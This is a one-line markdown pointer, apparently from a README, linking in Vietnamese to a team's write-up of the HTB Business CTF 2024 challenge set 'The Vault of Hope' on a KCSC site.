# Team write up: [Tại đây](https://kcsc.edu.vn/htb-business-ctf-2024-the-vault-of-hope-write-up?fbclid=IwY2xjawF5tBBleHRuA2FlbQIxMAABHUBADREdLyawPdAlOxwR9b0B_5qYHe7BInaovOEPljrzOkKMWqVssX3Pvw_aem_sbo3GIjSuixmivINXYVoHw)